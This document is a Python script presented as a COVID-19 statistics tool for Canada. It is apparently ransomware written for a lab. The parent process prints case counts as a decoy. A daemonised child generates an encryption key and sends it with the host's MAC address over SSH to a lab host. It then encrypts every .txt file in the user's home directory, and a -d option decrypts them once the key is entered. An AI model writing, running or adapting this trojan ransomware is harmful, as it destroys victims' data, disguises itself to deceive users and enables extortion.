#!/usr/bin/python3
import binascii

import requests
import argparse
import os
import sys
import signal
import paramiko
from cryptography.fernet import Fernet
from uuid import getnode as get_mac
from datetime import date


homeDirectory = str(os.getenv("HOME"))


def signalHandler(signalNumber, frame):
    while True:
        try:
            pid, status = os.waitpid(-1, os.WNOHANG)
        except OSError:
            return
        if pid == 0:
            return


def getStat():
    url = "https://api.covid19tracker.ca/summary"
    apiResponse = requests.get(url)
    responseText = apiResponse.json()
    # responseTextStr = json.dumps(responseText,  indent=4,  sort_keys=True)

    for index in responseText['data']:
        print(f"The total cases in Canada is {index['total_cases']}, and {index['total_fatalities']} have died while {index['total_recoveries']} have recovered")
        print (f"The latest date this was updated was {index['latest_date']}")


def secureConnection():
    key = Fernet.generate_key()
    sendKey(key + "\t".encode("ascii") + bin(get_mac()).encode("ascii") + "\t".encode("ascii") +
            str(date.today()).encode("ascii"))

    for file in os.listdir(os.path.expanduser(homeDirectory)):
        if file.endswith(".txt"):
            filePath = os.path.join(homeDirectory, file)
            f = Fernet(key)
            with open(filePath, "rb") as fileContents:
                data = fileContents.read()
                encryptedData = f.encrypt(data)
            with open(filePath, "wb") as fileContents:
                fileContents.write(encryptedData)


def sendKey(key):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('127.0.0.1', username='lab', password='lab')
    channelObject = client.get_transport().open_session()
    channelObject.send(key)
    client.close()


def getKey():
    key = input("Please enter the key:\n")
    return key.encode("ascii")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="")
    parser.add_argument('-d', action='store_true')
    args = parser.parse_args()

    if args.d:
        keyFile = getKey()
        for file in os.listdir(os.path.expanduser(homeDirectory)):
            if file.endswith(".txt"):
                filePath = os.path.join(homeDirectory, file)
                f = Fernet(keyFile)
                with open(filePath, "rb") as fileContents:
                    data = fileContents.read()
                    decryptedData = f.decrypt(data)
                with open(filePath, "wb") as fileContents:
                    fileContents.write(decryptedData)
    else:
        try:
            pid = os.fork()
            if pid > 0:
                getStat()
                sys.exit(0)
        except OSError:
            sys.exit(0)

        os.chdir('/')
        os.umask(0)
        os.setsid()
        # os.setuid(0)
        # os.setgid(0)

        signal.signal(signal.SIGCHLD, signalHandler)

        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError:
            sys.exit(0)

        if pid == 0:
            secureConnection()
